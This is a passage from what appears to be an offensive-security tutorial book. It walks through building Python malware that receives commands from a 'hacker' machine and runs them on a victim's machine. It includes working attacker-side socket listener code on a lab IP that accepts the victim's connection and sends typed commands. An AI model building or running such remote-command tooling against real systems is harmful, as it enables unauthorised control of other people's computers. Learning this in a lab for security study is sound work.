We have completed one part of the puzzle, which is to create a successful connection from the victim's machine to the hacker's machine, and received a small message at the victim's machine, sent by the hacker. This may not seem like a big task, but this is a very powerful tool. Using this, you can essentially take commands from the hacker. Design the victim program to run these commands on the machine and send the results back to the hacker. In the next section, we will learn how to send commands from the hacker's machine to the victim's machine and send the results back to the hacker.

# Running commands remotely on the victim's machine

We have already seen in Chapter 3, Reconnaissance and Information Gathering (in the Creating a Python script section), how to run commands on a computer using Python. We will build on that knowledge to create a malware that will take commands and execute them on a victim's machine. Our previous program just sends one message to the victim and exits. This time, we will modify the program to do much more than that.

Open a new project on the Kali machine to execute commands on the victim's machine and create a new file. Let's start by establishing a connection:

```
import socket

if __name__ == "__main__":
    hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    IP = "192.168.74.128"
    Port = 8008
    socket_address = (IP, Port)
    hacker_socket.bind(socket_address)
    hacker_socket.listen(5)
    print("listening for incoming connection requests")
    hacker_socket, client_address = hacker_socket.accept()
```

The next step involves taking the user input for the command we want to run on the victim's machine. Once this input is taken, we must convert it into bytes and send it over the connection to the victim program:

```
command = input("Enter the command ")
hacker_socket.send(command.encode())
```